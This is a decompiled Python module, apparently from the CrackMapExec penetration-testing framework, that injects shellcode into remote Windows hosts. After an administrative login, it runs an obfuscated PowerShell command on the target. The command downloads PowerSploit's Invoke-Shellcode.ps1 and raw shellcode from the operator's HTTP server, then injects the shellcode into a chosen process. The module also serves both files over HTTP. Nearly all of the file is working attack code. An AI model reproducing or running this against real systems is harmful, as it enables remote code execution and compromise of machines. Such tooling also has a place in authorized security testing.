# uncompyle6 version 3.6.7
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/modules/shellcode_inject.py
# Compiled at: 2016-12-29 01:51:56
import os
from cme.helpers import gen_random_string, create_ps_command, obfs_ps_script, get_ps_script
from sys import exit

class CMEModule:
    """
        Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
        Module by @byt3bl33d3r
    """
    name = 'shellinject'
    description = "Downloads the specified raw shellcode and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script"

    def options(self, context, module_options):
        """
            PATH     Path to the raw shellcode to inject
            PROCID   Process ID to inject into (default: current powershell process)
        """
        if 'PATH' not in module_options:
            context.log.error('PATH option is required!')
            exit(1)
        self.shellcode_path = os.path.expanduser(module_options['PATH'])
        if not os.path.exists(self.shellcode_path):
            context.log.error('Invalid path to shellcode!')
            exit(1)
        self.procid = None
        if 'PROCID' in module_options.keys():
            self.procid = module_options['PROCID']
        self.obfs_name = gen_random_string()
        return

    def on_admin_login(self, context, connection):
        payload = ("\n        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-Shellcode.ps1');\n        $WebClient = New-Object System.Net.WebClient;\n        [Byte[]]$bytes = $WebClient.DownloadData('{server}://{addr}:{port}/{shellcode}');\n        Invoke-{func_name} -Force -Shellcode $bytes").format(server=context.server, port=context.server_port, addr=context.localip, func_name=self.obfs_name, shellcode=os.path.basename(self.shellcode_path))
        if self.procid:
            payload += (' -ProcessID {}').format(self.procid)
        context.log.debug(('Payload:{}').format(payload))
        payload = create_ps_command(payload, force_ps32=True)
        connection.execute(payload)
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-Shellcode.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            with open(get_ps_script('Powersploit/CodeExecution/Invoke-Shellcode.ps1'), 'r') as (ps_script):
                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
                request.wfile.write(ps_script)
        elif os.path.basename(self.shellcode_path) == request.path[1:]:
            request.send_response(200)
            request.end_headers()
            with open(self.shellcode_path, 'rb') as (shellcode):
                request.wfile.write(shellcode.read())
            request.stop_tracking_host()
        else:
            request.send_response(404)
            request.end_headers()